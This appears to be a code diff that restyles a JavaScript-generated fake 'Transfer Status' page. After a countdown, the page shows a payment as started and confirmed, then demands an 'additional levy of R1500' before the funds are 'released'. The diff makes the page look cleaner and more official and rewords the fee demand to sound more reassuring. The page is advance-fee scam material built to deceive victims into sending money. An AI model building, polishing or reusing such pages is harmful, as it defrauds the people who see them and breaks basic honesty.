@@ -812,31 +812,86 @@ pourcentage + "%";
 tempsTexte.innerHTML =
 temps + " secunde rămase";
 
+setTimeout(function(){
+
 document.body.innerHTML = `
-<div style="padding:30px;font-family:Arial;background:#fff;height:100vh;">
+<div style="
+background:#f4f6fb;
+min-height:100vh;
+display:flex;
+justify-content:center;
+align-items:center;
+padding:20px;
+font-family:Arial,sans-serif;
+">
 
-<div style="display:flex;align-items:center;margin-bottom:15px;">
-<div style="width:40px;height:40px;border-radius:50%;background:#16a34a;color:#fff;display:flex;justify-content:center;align-items:center;font-size:24px;">✓</div>
-<span style="margin-left:15px;font-size:24px;">Transfer started</span>
-</div>
+<div style="
+background:#fff;
+width:100%;
+max-width:360px;
+border-radius:25px;
+padding:30px 25px;
+box-shadow:0 10px 30px rgba(0,0,0,.15);
+">
 
-<div style="width:4px;height:40px;background:#16a34a;margin-left:18px;"></div>
-
-<div style="display:flex;align-items:center;margin:15px 0;">
-<div style="width:40px;height:40px;border-radius:50%;background:#16a34a;color:#fff;display:flex;justify-content:center;align-items:center;font-size:24px;">✓</div>
-<span style="margin-left:15px;font-size:24px;">Payment confirmed</span>
-</div>
-
-<div style="width:4px;height:40px;background:#ddd;margin-left:18px;"></div>
+<h2 style="
+text-align:center;
+color:#222;
+margin-bottom:30px;
+font-size:24px;
+">
+Transfer Status
+</h2>
 
 <div style="display:flex;align-items:center;">
-<div style="width:40px;height:40px;border:3px solid #ddd;border-radius:50%;background:#fff;"></div>
+<div style="width:42px;height:42px;border-radius:50%;background:#22c55e;color:#fff;font-size:22px;font-weight:bold;display:flex;justify-content:center;align-items:center;">✓</div>
+<div style="margin-left:15px;">
+<div style="font-weight:bold;font-size:18px;">Transfer started</div>
+<div style="color:#777;font-size:13px;">Your transfer has been initiated.</div>
+</div>
 </div>
 
-<p style="margin-top:30px;color:#d00000;font-size:20px;font-weight:bold;line-height:1.6;">
-An additional levy of R1500 is needed urgently now, to conclude the confirmation of the transaction before you can receive your payment.
+<div style="width:3px;height:45px;background:#22c55e;margin:8px 0 8px 20px;"></div>
+
+<div style="display:flex;align-items:center;">
+<div style="width:42px;height:42px;border-radius:50%;background:#22c55e;color:#fff;font-size:22px;font-weight:bold;display:flex;justify-content:center;align-items:center;">✓</div>
+<div style="margin-left:15px;">
+<div style="font-weight:bold;font-size:18px;">Payment confirmed</div>
+<div style="color:#777;font-size:13px;">The payment has been verified.</div>
+</div>
+</div>
+
+<div style="width:3px;height:45px;background:#d9d9d9;margin:8px 0 8px 20px;"></div>
+
+<div style="display:flex;align-items:center;">
+<div style="width:42px;height:42px;border-radius:50%;border:3px solid #d9d9d9;background:#fff;"></div>
+<div style="margin-left:15px;">
+<div style="font-weight:bold;font-size:18px;color:#999;">Final confirmation</div>
+<div style="color:#999;font-size:13px;">Waiting for completion.</div>
+</div>
+</div>
+
+<div style="
+margin-top:35px;
+background:#fff3f3;
+border-left:5px solid #e53935;
+padding:15px;
+border-radius:12px;
+">
+
+<p style="
+margin:0;
+color:#c62828;
+font-size:15px;
+line-height:1.7;
+font-weight:bold;
+">
+An additional levy of <b>R1500</b> is required to complete the confirmation of your transaction. Once this payment is received, your funds will be released immediately.
 </p>
 
+</div>
+
+</div>
 </div>
 `;
 
